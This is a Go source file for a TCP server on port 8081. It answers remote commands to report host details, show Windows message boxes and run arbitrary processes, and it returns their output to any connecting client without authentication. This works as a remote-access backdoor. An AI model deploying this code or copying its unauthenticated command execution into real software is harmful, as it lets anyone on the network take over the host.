package server

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

var DELIM string = "<|!|>"
var wg sync.WaitGroup

func Listen() {
	server, err := net.Listen("tcp", "0.0.0.0:8081")
	if err != nil {
		log.Fatal("Could not start server:", err)
	}

	defer server.Close()
	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println("Could not accept client:", err)
		} else {
			go handleClient(conn)
		}
	}

}

func handleClient(conn net.Conn) {
	fmt.Printf("[%s] Connected\r\n", conn.RemoteAddr())
	for {
		message, err := receive(conn)
		if err != nil {
			fmt.Println("Failed to receive!")
			return
		}
		split_message := strings.Split(message, DELIM)
		command := split_message[0]

		fmt.Printf("[%s <- Received] %s\r\n", strings.Split(conn.RemoteAddr().String(), ":")[0], split_message)

		switch command {
		case "get_pc_info":
			var os_version string
			hostname, _ := os.Hostname()
			ipAddress := strings.Split(conn.LocalAddr().String(), ":")[0]
			k, reg_err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
			if reg_err != nil {
				os_version = runtime.GOOS
			} else {
				os_version, _, reg_err = k.GetStringValue("ProductName")
				if reg_err != nil {
					os_version = "Unknown"
				}
			}

			send([]string{command, hostname, ipAddress, os_version}, conn)
		case "show_messagebox":
			wg.Add(1)

			go func() {
				message, _ := syscall.UTF16PtrFromString(string(split_message[1]))
				title, _ := syscall.UTF16PtrFromString(string(split_message[2]))
				buttons, _ := strconv.Atoi(split_message[3])
				icon, _ := strconv.Atoi(split_message[4])
				mb := uintptr(icon) | uintptr(buttons) | uintptr(4096)

				syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
					0,
					uintptr(unsafe.Pointer(message)),
					uintptr(unsafe.Pointer(title)),
					mb,
				)
				wg.Done()
			}()

		case "run_process":
			process_name := string(split_message[1])
			params := strings.Split(process_name, " ")
			fmt.Println(params, len(params))
			var b []byte
			var err error
			if len(params) == 1 {
				b, err = exec.Command(params[0]).Output()
				fmt.Println(string(b), err)
			} else {
				b, err = exec.Command(params[0], params[1:]...).Output()
			}

			if err != nil {
				send([]string{"run_process", process_name, "false", err.Error()}, conn)
			} else {
				send([]string{"run_process", process_name, "true", string(b)}, conn)
			}
			// case "play_sound":
			// 	wg.Add(1)

			// 	sound_name := string(split_message[1])
			// 	f, err := os.Open("static/" + sound_name + ".mp3")
			// 	if err != nil {
			// 		send([]string{"play_sound", "false", err.Error()}, conn)
			// 		return
			// 	}

			// 	stream, format, err := mp3.Decode(f)
			// 	defer stream.Close()
			// 	if err != nil {
			// 		send([]string{"play_sound", "false", err.Error()}, conn)
			// 		return
			// 	}

			// 	out := make([]int32, 8192)
			// 	po_stream, err := portaudio.OpenDefaultStream(0, 1, float64(format.SampleRate), len(out), &out)
			// 	if err != nil {
			// 		send([]string{"play_sound", "false", err.Error()}, conn)
			// 		return
			// 	}
			// 	defer po_stream.Close()

			// 	go func() {
			// 		po_stream.Start()
			// 		defer po_stream.Stop()
			// 		for {
			// 			err := po_stream.Write()
			// 			if err != nil {
			// 				break
			// 			}
			// 		}
			// 		// Decrement the WaitGroup counter
			// 		wg.Done()
			// 	}()

		}

	}
}

func receive(conn net.Conn) (string, error) {

	messageSize := make([]byte, 10)

	conn.Read(messageSize)
	intMessageSize, err := strconv.Atoi(strings.TrimRight(string(messageSize), " "))
	if err != nil {
		return "", err
	}

	message := make([]byte, intMessageSize)
	conn.Read(message)

	return string(message), nil

}

func send(message []string, conn net.Conn) error {
	formattedMessage := strings.Join(message, DELIM)
	finalMessage := []byte(fmt.Sprintf("%-10d%s", len(formattedMessage), formattedMessage))
	_, err := conn.Write(finalMessage)
	if err == nil {
		fmt.Printf("[%s -> Sent] %s\r\n", strings.Split(conn.RemoteAddr().String(), ":")[0], message)
	}
	return err
}
